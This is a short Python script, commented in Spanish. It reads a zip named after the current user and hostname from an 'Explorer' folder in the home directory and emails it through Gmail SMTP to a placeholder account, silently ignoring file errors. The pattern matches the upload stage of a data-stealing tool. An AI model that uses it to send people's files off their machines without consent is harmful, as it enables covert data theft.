#!/usr/bin/python
#-*- coding: latin-1 -*-


print("###############################################")
print("############# ENVIAR CORREO GMAIL #############")
print("###############################################")

import smtplib
import email.mime.multipart
import email.mime.base
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import socket
import shutil
from pathlib import Path

def correo_gmail2():
    try:
        directorio_prueba = os.path.expanduser('~')  # Usuario actual...[C:\Users\admin]
        c = os.path.join(directorio_prueba, "Explorer") # Direccion de la carpeta dentro del usuario actual...[C:\Users\admin\Explorer]
        host = socket.gethostname() # Nombre del Usuario...[gohset]
        nusuario = os.getlogin() + "-" + host + ".zip" # Nombre del archivo... [admin-gohset.zip]
        #carpeta = Path(c)
        ###################################################################

        yo = 'tucuenta@gmail.com'
        pas = 'tuclavedeaplicacion' # Es necesario crear una clave de aplicacion en la cuenta de GMAIL...
        tu = 'tuamigo@gmail.com'
        asunto = "Correo electrónico"
        cuerpo = "-> ### Archivos enviados satisfactoriamente ###..."

        mensaje = MIMEMultipart('plain')
        mensaje['From'] = yo
        mensaje['To'] = tu
        mensaje['subject'] = asunto
        mensaje['subject'] = cuerpo
        tema = MIMEText(cuerpo, 'html')
        mensaje.attach(tema)
        adjunto = MIMEBase('application','octect-stream')
        adjunto.set_payload(open(os.path.join(c, nusuario), "rb").read())
        email.encoders.encode_base64(adjunto)
        adjunto.add_header('content-Disposition', "attachment; filename= %s" % nusuario)
        mensaje.attach(adjunto)
        smtp = smtplib.SMTP('smtp.gmail.com', 587)
        smtp.starttls()
        smtp.login(yo, pas)
        smtp.sendmail(yo,tu,mensaje.as_string())
        smtp.quit()

    except IOError:
        pass

correo_gmail2()
#input("\nPrecione una tecla para continuar...")
